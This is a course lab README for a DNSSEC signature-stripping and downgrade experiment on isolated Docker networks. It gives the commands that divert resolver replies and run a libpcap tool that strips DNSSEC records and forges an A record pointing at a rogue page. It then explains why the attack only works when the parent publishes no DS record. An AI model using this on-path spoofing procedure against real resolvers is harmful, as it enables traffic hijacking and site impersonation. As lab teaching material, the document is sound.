# Phase 4 — Signature Stripping & Downgrade

The Phase 3 chain of trust defeated a plain forged answer. Phase 4 tries to make
the signed zone *look unsigned* so the Phase 2 forgery is accepted again, in two
runs:

* **Run A** attacks the **unchanged Phase 3 hierarchy** (`com` *does* publish a
  DS for `example.com`). The attacker strips every `example.com`-scoped DNSSEC
  record on the wire — RRSIG, DNSKEY, and the DS (and its RRSIG) from the `com`
  referral — and injects a forged `A` → **the attack fails** (SERVFAIL).
* **Run B** changes the deployment by exactly one thing: **`com` publishes no DS
  for `example.com`** (the child stays fully signed). The same strip-and-forge
  attack now **succeeds** — the client lands on `rogue-web` (`172.16.1.30`).

Everything runs on the isolated Docker bridges from Phases 1–3; nothing touches
the real Internet. The attacker program is **C + libpcap only**
(`pcap_sendpacket` / `pcap_inject`), as required; `dig`/`delv` are used only to
verify.

> **Design note — no hard-coded MACs or interface names.** The attacker
> discovers the resolver's MAC by ARP at startup, and the diversion/capture
> scripts detect the resolver-subnet interface by its address. So a grader on a
> clean checkout reproduces the result unchanged, whatever MACs and `ethN`
> ordering Docker assigns.

## Layout

```
phase4/
  compose.yml                 topology (= Phase 3, project cs6008-p4)
  configs/                    validating resolver + authoritative BIND configs
  zones/                      db.root / db.com / db.example.com (+ .signed built by scripts)
  scripts/
    sign-zones.sh             Run A: full chain, DS at every level (= Phase 3)
    sign-zones-runB.sh        Run B: re-sign com WITHOUT example.com's DS (reuses keys)
    build-attacker.sh         compile src/stripper.c -> /usr/local/bin/stripper
    divert-on.sh / divert-off.sh   core-router diversion of resolver-bound replies
  src/
    stripper.c                C/libpcap interceptor: --relay / --strip-runA / --strip-runB
    Makefile
  www/ rogue_www/             legitimate and defacement pages
  evidence/                   logs, captures, dig/delv/curl output (generated)
```

Keys, `*.signed`/`*.unsigned` zones, the compiled binary and everything under
`evidence/` are regenerated by the commands below and are **not** committed.

## 0. Prerequisites

Build the shared lab image once (same image as every phase):

```bash
sudo docker build -t cs6008-dns-lab:local -f ../common/Dockerfile ..
```

Make `evidence/` writable by your user (Docker may create it as root when it
mounts the volume, which would make the host-side `tee` fail):

```bash
mkdir -p evidence && chmod 777 evidence
```

## Run A — strip & forge against the full Phase 3 chain (expected: FAIL)

### A.1 Sign the chain (DS published at every level)

```bash
sudo docker run --rm -v "$PWD:/lab" --entrypoint /bin/bash \
     cs6008-dns-lab:local /lab/scripts/sign-zones.sh
```

Confirm the resolver trust anchor is a **complete** root KSK — the base64 in
quotes must end in `=`/`==` and contain **no internal space**:

```bash
cat configs/trust-anchors.conf
```

### A.2 Deploy and build the attacker

```bash
sudo docker compose up -d
sudo docker compose exec -T attacker /scripts/build-attacker.sh
```

> If you ever **re-sign** after the stack is already up, the resolver and
> nameservers must reload the new keys/zones/anchor — plain `up -d` is a no-op on
> running containers. Use `sudo docker compose up -d --force-recreate`, then
> rebuild the attacker (a fresh container has no compiled binary):
> `sudo docker compose exec -T attacker /scripts/build-attacker.sh`.

### A.3 Baseline + Verify 4.2 — authentic resolution through a transparent relay

First confirm the signed chain validates with no attacker in the path:

```bash
sudo docker compose exec -T resolver rndc -k /run/named/rndc.key -s 127.0.0.1 flush
sudo docker compose exec -T client dig +dnssec example.com A +time=6 +tries=2
```
Expect `status: NOERROR`, `flags: qr rd ra ad`, `example.com. A 172.16.1.20` + `RRSIG`.

Now put the attacker on-path in `--relay` (transparent) mode and re-check:

```bash
sudo docker compose exec -T core-router /scripts/divert-on.sh
sudo docker compose exec -d attacker sh -c 'exec /usr/local/bin/stripper --relay > /evidence/stripper-relay.log 2>&1'
sudo docker compose exec -T resolver rndc -k /run/named/rndc.key -s 127.0.0.1 flush
sudo docker compose exec -T client dig +dnssec example.com A +time=6 +tries=2 | tee evidence/a-verify-dig.txt
sudo docker compose exec -T client curl --noproxy '*' --fail --max-time 5 http://example.com/ | tee evidence/a-verify-curl.html
sudo docker compose exec -T attacker pkill -x stripper || true
```
Still `ad` + `172.16.1.20` + the real page — the relay is transparent.

### A.4 Attack — strip the signatures and forge the A

```bash
# capture the authoritative<->resolver exchange on the resolver-subnet interface
IFACE=$(sudo docker compose exec -T core-router sh -c 'ip -o -4 addr show' | grep -oE 'eth[0-9]+ +inet 172\.16\.2\.' | grep -oE 'eth[0-9]+' | head -1)
sudo docker compose exec -d core-router sh -c "exec tcpdump -i $IFACE -nn -s0 -U -Z root -w /evidence/p4-runA.pcap 'udp port 53' > /evidence/p4-runA-tcpdump.log 2>&1"

sudo docker compose exec -T core-router /scripts/divert-on.sh
sudo docker compose exec -d attacker sh -c 'exec /usr/local/bin/stripper --strip-runA > /evidence/stripper-runA.log 2>&1'
sudo docker compose exec -T resolver rndc -k /run/named/rndc.key -s 127.0.0.1 flush

sudo docker compose exec -T client dig example.com A +time=6 +tries=2 | tee evidence/a-attack-dig.txt
sudo docker compose exec -T client sh -c "curl --noproxy '*' --fail --show-error --max-time 5 http://example.com/ ; echo curl-exit=\$?" | tee evidence/a-attack-curl.txt

sudo docker compose exec -T attacker pkill -x stripper || true
sudo docker compose exec -T core-router pkill -INT -x tcpdump || true
sudo docker compose exec -T core-router /scripts/divert-off.sh

sudo docker compose exec -T attacker cat /evidence/stripper-runA.log
sudo docker compose logs resolver --since 2m | grep -Ei 'bogus|no valid|RRSIG|insecur|broken|DS ' | tee evidence/a-resolver-log.txt
```

**Observed Run A result (the attack fails):**

```
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL
curl: (6) Could not resolve host: example.com        → curl-exit=6
```
The stripper log confirms the attacker *did* strip and forge:
```
[STRIP] removed example.com DNSSEC RRs from reply (qname=example.com qtype=1)  248->101 bytes
[FORGE] example.com A (id 0x....) -> 172.16.1.30  [runA]
[STRIP] removed example.com DNSSEC RRs from reply (qname=example.com qtype=43) 215->68 bytes
```
…and the resolver still rejects it:
```
broken trust chain resolving 'example.com/A/IN': 172.16.3.30#53
```

## Run B — the operator mistake: no DS in the parent (expected: SUCCEED)

Keep the same running deployment. Make the single change — re-sign `com`
**without** `example.com`'s DS (child stays fully signed, root untouched, trust
anchor unchanged) — then reload `tld-ns` and flush the resolver.

### B.1 Re-sign com with no DS for example.com

```bash
sudo docker run --rm -v "$PWD:/lab" --entrypoint /bin/bash \
     cs6008-dns-lab:local /lab/scripts/sign-zones-runB.sh
sudo docker compose restart tld-ns
sudo docker compose exec -T resolver rndc -k /run/named/rndc.key -s 127.0.0.1 flush
```

Confirm the delegation is now an *authenticated insecure* one:

```bash
sudo docker compose exec -T client delv @172.16.2.10 -a /lab/configs/trust-anchors.conf example.com A | tee evidence/b-delv-insecure.txt
sudo docker compose exec -T client dig example.com DS +dnssec | tee evidence/b-ds-nodata.txt
```

**Observed:** `delv` reports `; unsigned answer` (not `; fully validated`), and
the DS query is an authenticated NODATA whose signed NSEC proves no DS exists —
note the type bitmap has **no `DS`**:
```
example.com. IN NSEC  ns.com. NS RRSIG NSEC
example.com. IN RRSIG NSEC 13 2 ... com.          (signed by com, ad flag set)
```

### B.2 Attack — same strip-and-forge, now accepted

```bash
IFACE=$(sudo docker compose exec -T core-router sh -c 'ip -o -4 addr show' | grep -oE 'eth[0-9]+ +inet 172\.16\.2\.' | grep -oE 'eth[0-9]+' | head -1)
sudo docker compose exec -d core-router sh -c "exec tcpdump -i $IFACE -nn -s0 -U -Z root -w /evidence/p4-runB.pcap 'udp port 53' > /evidence/p4-runB-tcpdump.log 2>&1"

sudo docker compose exec -T core-router /scripts/divert-on.sh
sudo docker compose exec -d attacker sh -c 'exec /usr/local/bin/stripper --strip-runB > /evidence/stripper-runB.log 2>&1'
sudo docker compose exec -T resolver rndc -k /run/named/rndc.key -s 127.0.0.1 flush

sudo docker compose exec -T client dig example.com A +time=6 +tries=2 | tee evidence/b-attack-dig.txt
sudo docker compose exec -T client curl --noproxy '*' --fail --show-error --max-time 5 http://example.com/ | tee evidence/b-attack-curl.html

sudo docker compose exec -T attacker pkill -x stripper || true
sudo docker compose exec -T core-router pkill -INT -x tcpdump || true
sudo docker compose exec -T core-router /scripts/divert-off.sh
```

**Observed Run B result (the attack succeeds):**

```
;; ->>HEADER<<- opcode: QUERY, status: NOERROR          (note: NO ad flag)
example.com.  300  IN  A  172.16.1.30
```
and `curl` returns the **rogue** defacement page. The validating resolver served
the forgery because it had authenticated — from `com`'s signed NSEC — that
`example.com` has no secure delegation.

```bash
sudo docker compose down
```

## Report answers (4.4)

**Run A — what happens when the signatures (and even the DS) are stripped, and
why the attacker can't make the zone look unsigned.** The stripper removes every
`example.com`-scoped DNSSEC RR on the wire and injects an unsigned `A`, but the
resolver returns **SERVFAIL / broken trust chain**. Because `com` publishes a DS
for `example.com`, the resolver knows the zone *must* be secure. A validating
resolver only drops a delegation to *insecure* when it holds an **authenticated
proof that no DS exists** — a signed NSEC/NSEC3 from the parent. The on-path
attacker holds no `com` key, so it can neither forge that proof nor strip its way
to one; the missing/edited DS makes the delegation *unverifiable*, i.e. **bogus**,
never *insecure*. Stripping also makes the whole `example.com` zone unvalidatable,
so names under it (e.g. `www`) fail too while the attack runs — the honest
consequence of a zone-wide downgrade, not a working non-target.

**Run B — the single change and why it reopens the attack.** The only change is
`sign-zones-runB.sh` re-signing `com` **without** publishing `example.com`'s DS
(the child is still fully signed; the root and the trust anchor are untouched).
Now `com`'s own signed NSEC *authenticatedly proves* "example.com has no DS", so
the root-anchored resolver marks the delegation **insecure**, stops validating
the child, and accepts the unsigned forged `A`. The final answer carries **no
`ad` flag** (insecure), in contrast to the DS-denial which *is* validated.

**Where downgrade resistance actually comes from, and the exact operator
mistake.** It comes from the **parent-side signed DS and signed denial-of-DS**,
not from the child's own signatures. To a validating resolver, a signed zone
whose DS was never published in its parent is indistinguishable from an unsigned
one. The operator mistake is precisely that: signing the child but never handing
its DS to the parent (or letting it lapse), which forfeits the secure link into
the zone and reopens on-path forgery.
